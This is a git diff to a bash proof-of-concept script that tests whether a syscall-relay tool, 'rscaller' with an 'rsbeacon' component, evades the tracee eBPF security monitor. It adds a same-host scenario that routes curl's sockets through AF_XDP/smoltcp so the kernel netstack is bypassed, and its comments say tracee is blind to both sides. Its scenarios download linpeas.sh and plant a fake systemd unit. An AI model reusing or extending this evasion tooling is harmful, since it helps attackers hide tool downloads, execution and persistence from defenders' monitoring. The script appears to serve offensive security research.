@@ -23,6 +23,8 @@
 #   --netstack <name>   rsbeacon --netstack: direct|smoltcp-xdp          (default: direct)
 #   --xdp-iface <name>  rsbeacon --xdp-iface (required if --netstack smoltcp-xdp)
 #   --xdp-queue <n>     rsbeacon --xdp-queue                             (default: 0)
+#   --xdp-ip <addr>     rsbeacon --xdp-ip — smoltcp's own IPv4; must differ
+#                       from the beacon's kernel IP (required if smoltcp-xdp)
 #   --events   <list>   Comma-separated tracee --events to capture       (default: execve,execveat)
 #   --query    <list>   Comma-separated substrings; only events whose
 #                       processName/eventName/args match ANY of them are
@@ -57,9 +59,13 @@
 #              (the filename — "cron" would match the cron daemon's routine
 #              activity and flood the count).
 #   network  — curl-download linpeas.sh via the relay profile (network
-#              syscalls forwarded, file lands on the CLIENT) vs. curling it
-#              directly on the beacon. Watches execve/execveat +
-#              security_socket_connect,net_packet_tcp,net_packet_udp,net_packet_dns.
+#              syscalls forwarded, traffic attributed to rsbeacon) vs.
+#              curling it directly on the beacon. Watches
+#              security_socket_connect,net_packet_dns, queries for "curl".
+#   network-local — same as network, but client and beacon are the SAME VM:
+#              curl runs on the beacon under seccomp-notify (no kmod needed),
+#              rsbeacon on localhost serves the sockets via AF_XDP/smoltcp,
+#              bypassing the kernel netstack — tracee is blind to both sides.
 #   qemu     — plant a fake systemd unit (systemd-update.service + enable
 #              symlink) on the beacon's scratch disk /dev/vdb through the QEMU
 #              relay VM (device I/O inside the guest, invisible to the
@@ -94,6 +100,7 @@ NO_TRACEE=0
 NETSTACK="${NETSTACK:-direct}"
 XDP_IFACE="${XDP_IFACE:-}"
 XDP_QUEUE="${XDP_QUEUE:-0}"
+XDP_IP="${XDP_IP:-}"
 TRACEE_EVENTS="execve,execveat"
 QUERY=""
 BASELINE_CMD=""
@@ -110,6 +117,8 @@ EVENTS_SET=0
 QUERY_SET=0
 BASELINE_CMD_SET=0
 CLEANUP_CMD_SET=0
+CLIENT_SET=0
+BEACON_SET=0
 
 bold=$'\e[1m'
 dim=$'\e[2m'
@@ -149,10 +158,12 @@ while [[ $# -gt 0 ]]; do
 		;;
 	--beacon)
 		BEACON_VM="$2"
+		BEACON_SET=1
 		shift 2
 		;;
 	--client)
 		REMOTE="$2"
+		CLIENT_SET=1
 		shift 2
 		;;
 	--port)
@@ -173,6 +184,10 @@ while [[ $# -gt 0 ]]; do
 		;;
 	--xdp-queue)
 		XDP_QUEUE="$2"
+		shift 2
+		;;
+	--xdp-ip)
+		XDP_IP="$2"
 		shift 2
 		;;
 	--events)
@@ -242,10 +257,69 @@ if [[ -n "$SCENARIO" ]]; then
 	network)
 		[[ "$PROFILE_SET" -eq 1 ]] || PROFILE="relay"
 		LINPEAS_URL="https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh"
-		[[ "$CMD_SET" -eq 1 ]] || CMD="curl -fsSL '$LINPEAS_URL' -o /tmp/linpeas.sh"
-		[[ "$BASELINE_CMD_SET" -eq 1 ]] || BASELINE_CMD="curl -fsSL '$LINPEAS_URL' -o /tmp/linpeas.sh"
-		[[ "$EVENTS_SET" -eq 1 ]] || TRACEE_EVENTS="execve,execveat,security_socket_connect,net_packet_tcp,net_packet_udp,net_packet_dns"
-		[[ "$QUERY_SET" -eq 1 ]] || QUERY="curl,github,linpeas"
+		# curl -0 (HTTP/1.0): curl's default H2/happy-eyeballs pattern hangs
+		# on teardown over the relay (known issue — keepalive-tail frames
+		# never deliver a session EOF through the socket proxy). H1.0 is
+		# close-delimited and completes cleanly; payload bytes are identical.
+		[[ "$CMD_SET" -eq 1 ]] || CMD="curl -0 -fsSL --max-time 30 '$LINPEAS_URL' -o /tmp/linpeas.sh"
+		[[ "$BASELINE_CMD_SET" -eq 1 ]] || BASELINE_CMD="curl -0 -fsSL --max-time 30 '$LINPEAS_URL' -o /tmp/linpeas.sh"
+		# Network events only, no execs. Query is the process name: baseline's
+		# connections/DNS are attributed to curl; relay-forwarded traffic is
+		# attributed to rsbeacon on the beacon, so it never matches.
+		# net_packet_dns_request/response need --cgroupns=host (cgroup skb
+		# hooks); plain net_packet_dns is not in tracee's default set.
+		# net_packet_tcp intentionally excluded — one event per packet floods
+		# the output during a download.
+		[[ "$EVENTS_SET" -eq 1 ]] || TRACEE_EVENTS="security_socket_connect,net_packet_dns_request,net_packet_dns_response"
+		[[ "$QUERY_SET" -eq 1 ]] || QUERY="curl"
+		[[ "$CLEANUP_CMD_SET" -eq 1 ]] || CLEANUP_CMD="rm -f /tmp/linpeas.sh"
+		COMPARE=1
+		;;
+	network-local)
+		# Same-host variant of `network`: client and beacon are the same VM.
+		# curl runs on the beacon under seccomp-notify (relay needs no kmod),
+		# rsbeacon on localhost executes the sockets via AF_XDP/smoltcp,
+		# bypassing the kernel netstack — tracee sees neither curl's sockets
+		# (never executed in-kernel) nor rsbeacon's (XDP is below the skb hooks).
+		[[ "$BEACON_SET" -eq 1 ]] || BEACON_VM="dev-vm-2"
+		[[ "$CLIENT_SET" -eq 1 ]] || REMOTE="$BEACON_VM"
+		[[ "$PROFILE_SET" -eq 1 ]] || PROFILE="relay"
+		NETSTACK="smoltcp-xdp"
+		if [[ -z "$XDP_IFACE" ]]; then
+			XDP_IFACE=$(ssh "$BEACON_VM" "ip route show default | awk '{print \$5; exit}'" 2>/dev/null) ||
+				die "could not auto-detect default iface on $BEACON_VM — pass --xdp-iface"
+		fi
+		# smoltcp's own address — must differ from the beacon's kernel IP
+		# (see rsbeacon smoltcp_xdp::init) and be unused on the subnet.
+		[[ -n "$XDP_IP" ]] || XDP_IP="192.168.122.250"
+		if [[ "$PROFILE_SET" -eq 0 ]]; then
+			# smoltcp can't reach the loopback stub resolver (127.0.0.53) —
+			# overlay /etc/resolv.conf with the subnet gateway's resolver via
+			# a host-bind mount in a generated profile variant of `relay`.
+			local_gw=$(ssh "$BEACON_VM" "ip route show default | awk '{print \$3; exit}'") ||
+				die "could not detect default gateway on $BEACON_VM"
+			ssh "$BEACON_VM" "printf 'nameserver %s\n' '$local_gw' > /tmp/rsc-poc-resolv.conf"
+			ssh "$BEACON_VM" "cat > /tmp/rsc-poc-relay-local.yaml" <<'EOF'
+name: relay-local
+description: "relay + resolv.conf via gateway resolver (smoltcp can't reach loopback DNS)"
+mounts:
+  - remote: /tmp/rsc-poc-resolv.conf
+    local: /etc/resolv.conf
+    type: host
+forward:
+  - name: network
+    syscalls: [socket, connect, bind, accept4, sendto, recvfrom, sendmsg, recvmsg, getsockopt, setsockopt]
+    filter:
+      default_direction: REMOTE
+EOF
+			PROFILE="/tmp/rsc-poc-relay-local.yaml"
+		fi
+		LINPEAS_URL="https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh"
+		# See the `network` scenario for why curl gets -0.
+		[[ "$CMD_SET" -eq 1 ]] || CMD="curl -0 -fsSL --max-time 30 '$LINPEAS_URL' -o /tmp/linpeas.sh"
+		[[ "$BASELINE_CMD_SET" -eq 1 ]] || BASELINE_CMD="curl -0 -fsSL --max-time 30 '$LINPEAS_URL' -o /tmp/linpeas.sh"
+		[[ "$EVENTS_SET" -eq 1 ]] || TRACEE_EVENTS="security_socket_connect,net_packet_dns_request,net_packet_dns_response"
+		[[ "$QUERY_SET" -eq 1 ]] || QUERY="curl"
 		[[ "$CLEANUP_CMD_SET" -eq 1 ]] || CLEANUP_CMD="rm -f /tmp/linpeas.sh"
 		COMPARE=1
 		;;
@@ -267,7 +341,7 @@ if [[ -n "$SCENARIO" ]]; then
 		COMPARE=1
 		;;
 	*)
-		die "Unknown --scenario '$SCENARIO'. Valid: exec file network qemu"
+		die "Unknown --scenario '$SCENARIO'. Valid: exec file network network-local qemu"
 		;;
 	esac
 fi
@@ -301,13 +375,18 @@ fi
 
 RSC="$REMOTE_DIR/target/release/rsc"
 RSCLIENT="$REMOTE_DIR/target/release/rsclient"
-NAME="prof-$PROFILE"
+# Path profiles (contain '/') name the mount after the file basename.
+case "$PROFILE" in
+*/*) NAME="prof-$(basename "$PROFILE" .yaml)" ;;
+*) NAME="prof-$PROFILE" ;;
+esac
 MOUNT_POINT="$MOUNT_BASE/$NAME"
 
 # ── Validate profile ─────────────────────────────────────────────────────────
 case "$PROFILE" in
 none | recon | relay | shadow | ghost | qemu-relay) ;;
-*) die "Unknown profile '$PROFILE'. Valid: none recon relay shadow ghost qemu-relay" ;;
+*/*) ssh "$REMOTE" "test -f '$PROFILE'" || die "profile file '$PROFILE' not found on $REMOTE" ;;
+*) die "Unknown profile '$PROFILE'. Valid: none recon relay shadow ghost qemu-relay, or a YAML path" ;;
 esac
 
 # ── qemu-relay prerequisites (fail fast with a clear message) ───────────────
@@ -325,21 +404,29 @@ case "$NETSTACK" in
 direct) ;;
 smoltcp-xdp)
 	[[ -n "$XDP_IFACE" ]] || die "--netstack smoltcp-xdp requires --xdp-iface <interface>"
+	# rsbeacon refuses a smoltcp address equal to the iface's kernel
+	# address (shared-IP ARP hijack kills host networking), so an
+	# explicit distinct --xdp-ip is effectively required.
+	[[ -n "$XDP_IP" ]] || die "--netstack smoltcp-xdp requires --xdp-ip <unused subnet IP>"
 	;;
 *) die "Unknown --netstack '$NETSTACK'. Valid: direct smoltcp-xdp" ;;
 esac
 NETSTACK_ARGS="--netstack $NETSTACK"
-[[ "$NETSTACK" == "smoltcp-xdp" ]] && NETSTACK_ARGS="$NETSTACK_ARGS --xdp-iface $XDP_IFACE --xdp-queue $XDP_QUEUE"
+if [[ "$NETSTACK" == "smoltcp-xdp" ]]; then
+	NETSTACK_ARGS="$NETSTACK_ARGS --xdp-iface $XDP_IFACE --xdp-queue $XDP_QUEUE"
+	[[ -n "$XDP_IP" ]] && NETSTACK_ARGS="$NETSTACK_ARGS --xdp-ip $XDP_IP"
+fi
 
 # ── Print plan ───────────────────────────────────────────────────────────────
 echo ""
 echo "${bold}rscaller PoC — mount namespace overlay${reset}"
 echo "  client:   ${green}${REMOTE}${reset}"
 echo "  beacon:   ${green}${BEACON_VM}:${BEACON_PORT}${reset}"
-echo "  netstack: ${yellow}${NETSTACK}${reset}$([ "$NETSTACK" == "smoltcp-xdp" ] && echo " (iface=$XDP_IFACE queue=$XDP_QUEUE)")"
+echo "  netstack: ${yellow}${NETSTACK}${reset}$([ "$NETSTACK" == "smoltcp-xdp" ] && echo " (iface=$XDP_IFACE queue=$XDP_QUEUE ip=$XDP_IP)")"
 echo "  profile:  ${yellow}${PROFILE}${reset}"
 echo "  command:  ${dim}${CMD}${reset}"
-echo "  tracee:   $([ "$NO_TRACEE" -eq 1 ] && echo "disabled" || echo "enabled (events=${TRACEE_EVENTS})")"
+echo "  tracee:   $([ "$NO_TRACEE" -eq 1 ] && echo "disabled" || echo "enabled")"
+[[ "$NO_TRACEE" -eq 0 ]] && echo "  events:   ${dim}${TRACEE_EVENTS}${reset}"
 [[ -n "$QUERY" ]] && echo "  query:    ${dim}${QUERY}${reset}"
 if [[ "$COMPARE" -eq 1 ]]; then
 	echo "  compare:  ${dim}baseline-cmd=${BASELINE_CMD}${reset}"
@@ -360,7 +447,7 @@ start_tracee() {
 	say "starting tracee container on $BEACON_VM (image: $TRACEE_IMAGE)"
 	ssh "$BEACON_VM" "
         nohup sudo docker run --rm --name '$TRACEE_CONTAINER' \
-            --privileged --pid=host \
+            --privileged --pid=host --cgroupns=host \
             -v /lib/modules:/lib/modules:ro \
             -v /usr/src:/usr/src:ro \
             -v /etc/os-release:/etc/os-release-host:ro \
@@ -393,10 +480,18 @@ stop_tracee_and_filter() {
 	out=$(ssh "$BEACON_VM" "cat $TRACEE_LOG 2>/dev/null" |
 		python3 -c "
 import sys, json
+# Noise filters. motd*: SSH-login MOTD helpers. rsbeacon/tokio-rt-worker
+# (rsbeacon's main and thread names): the relay transport itself — with a
+# working relay profile the payload sockets are serviced BY rsbeacon, so
+# its syscalls are infrastructure, not payload activity (the demo claim:
+# nothing attributed to the payload process).
 motd = {'50-landscape-sy','50-motd-news','85-fwupd','90-updates-avai',
-        'update-motd-fsc','update-motd-upd','landscape-sysinfo'}
+        'update-motd-fsc','update-motd-upd','landscape-sysinfo',
+        'rsbeacon','tokio-rt-worker'}
 query = [q.strip().lower() for q in '$QUERY'.split(',') if q.strip()]
 found = 0
+seen = {}
+order = []
 for line in sys.stdin:
     line = line.strip()
     if not line:
@@ -422,11 +517,54 @@ for line in sys.stdin:
     else:
         cmdline = str(next((a.get('value') for a in args
                             if isinstance(a, dict) and a.get('name') == 'pathname'), ''))
-    if found < 50:
-        print(f'  {evt:<9} {proc:<14} {cmdline}'[:160].rstrip())
+    if not cmdline:
+        ra = next((a.get('value') for a in args
+                   if isinstance(a, dict) and a.get('name') == 'remote_addr'), None)
+        if isinstance(ra, dict):
+            fam = ra.get('sa_family', '')
+            if fam == 'AF_INET':
+                cmdline = '%s:%s' % (ra.get('sin_addr', '?'), ra.get('sin_port', '?'))
+            elif fam == 'AF_INET6':
+                cmdline = '[%s]:%s' % (ra.get('sin6_addr', '?'), ra.get('sin6_port', '?'))
+            else:
+                cmdline = str(ra.get('sun_path', ra))
+    # Skip unix-socket rows (cmdline = sun_path): local IPC (nscd etc.),
+    # not network activity — outside this scenario's claim either way.
+    if cmdline.startswith('/'):
+        continue
+    if not cmdline and evt.startswith('net_packet_dns'):
+        md = next((a.get('value') for a in args
+                   if isinstance(a, dict) and a.get('name') == 'metadata'), {}) or {}
+        qs = next((a.get('value') for a in args
+                   if isinstance(a, dict) and a.get('name') in ('dns_questions', 'dns_response')), []) or []
+        names = [str(q.get('query') or q.get('name') or q.get('answer') or '')
+                 for q in qs if isinstance(q, dict)]
+        # Drop ephemeral ports so retries collapse into one deduped row.
+        def ep(ip, port):
+            p = str(port)
+            return '%s:%s' % (ip, p) if p.isdigit() and int(p) < 1024 else str(ip)
+        cmdline = ('%s -> %s %s' % (
+            ep(md.get('src_ip', '?'), md.get('src_port', '?')),
+            ep(md.get('dst_ip', '?'), md.get('dst_port', '?')),
+            ','.join(n for n in names if n))).strip()
+    if not cmdline:
+        for a in args:
+            if (isinstance(a, dict) and a.get('name') not in ('sockfd', 'type')
+                    and a.get('value') not in (None, '', [])):
+                cmdline = json.dumps(a['value'], default=str)[:100]
+                break
+    key = (evt, proc, cmdline)
+    if key not in seen:
+        seen[key] = 0
+        order.append(key)
+    seen[key] += 1
     found += 1
-if found > 50:
-    print(f'  ... {found - 50} more')
+for evt, proc, cmdline in order[:50]:
+    n = seen[(evt, proc, cmdline)]
+    suffix = (' x%d' % n) if n > 1 else ''
+    print(f'  {evt:<9} {proc:<14} {cmdline}{suffix}'[:160].rstrip())
+if len(order) > 50:
+    print(f'  ... {len(order) - 50} more unique, {found} total')
 print(f'COUNT={found}')
 " 2>/dev/null || echo "COUNT=0")
 	LAST_EVENT_COUNT=$(echo "$out" | grep -o 'COUNT=[0-9]*' | tail -1 | cut -d= -f2)
@@ -470,7 +608,8 @@ if [[ "$COMPARE" -eq 1 && "$NO_TRACEE" -eq 0 ]]; then
 	run_remote "$BEACON_VM" "$BASELINE_CMD" 2>&1 | head -n 8
 	set -e
 	echo ""
-	say "Baseline tracee events (events=${TRACEE_EVENTS}${QUERY:+, query=$QUERY})"
+	say "Baseline tracee events"
+	info "events: ${TRACEE_EVENTS}${QUERY:+   query: $QUERY}"
 	stop_tracee_and_filter
 	BASELINE_COUNT="$LAST_EVENT_COUNT"
 	# Clean up the baseline artifact now — outside the capture window and
@@ -494,7 +633,12 @@ if [[ "$NO_TRACEE" -eq 0 ]]; then
 fi
 
 # ── Step 3: Clean up stale mounts ───────────────────────────────────────────
-BEACON_IP_SSH=$(ssh "$BEACON_VM" "hostname -I | awk '{print \$1}'" 2>/dev/null)
+# Same-host runs (client == beacon) talk to rsbeacon over loopback.
+if [[ "$REMOTE" == "$BEACON_VM" ]]; then
+	BEACON_IP_SSH="127.0.0.1"
+else
+	BEACON_IP_SSH=$(ssh "$BEACON_VM" "hostname -I | awk '{print \$1}'" 2>/dev/null)
+fi
 
 say "Cleaning stale mounts on $REMOTE"
 ssh "$REMOTE" "mkdir -p '$MOUNT_BASE'; \
@@ -508,7 +652,7 @@ echo ""
 echo "─── stdout ──────────────────────────────────────────────────────────────"
 set +e
 ssh "$REMOTE" \
-	"sudo $RSC exec \
+	"sudo RUST_LOG=${RUST_LOG:-info} $RSC exec \
         --beacon '${BEACON_IP_SSH}:${BEACON_PORT}' \
         --rsclient '$RSCLIENT' \
         --mount-base '$MOUNT_BASE' \
@@ -531,7 +675,8 @@ ssh "$REMOTE" \
 # ── Step 6: Print tracee events for the evasion run ─────────────────────────
 EVASION_COUNT=""
 if [[ "$NO_TRACEE" -eq 0 ]]; then
-	say "Evasion tracee events from $BEACON_VM (events=${TRACEE_EVENTS}${QUERY:+, query=$QUERY})"
+	say "Evasion tracee events from $BEACON_VM"
+	info "events: ${TRACEE_EVENTS}${QUERY:+   query: $QUERY}"
 	echo ""
 	stop_tracee_and_filter
 	EVASION_COUNT="$LAST_EVENT_COUNT"
